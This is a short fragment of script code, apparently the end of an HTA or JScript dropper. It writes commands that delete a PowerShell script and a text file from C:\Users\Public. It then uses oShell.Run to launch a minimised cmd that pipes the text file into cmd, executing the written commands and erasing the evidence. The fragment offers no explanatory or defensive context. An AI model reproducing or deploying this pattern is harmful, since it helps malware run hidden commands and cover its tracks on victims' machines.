        s.WriteLine("del C:\\Users\\Public\\e.ps1");
        s.WriteLine("del C:\\Users\\Public\\file.txt");

        c = 'cmd.exe /c start /min "" cmd /c "type C:\\Users\\Public\\file.txt | cmd';
        oShell.Run(c);
</script>
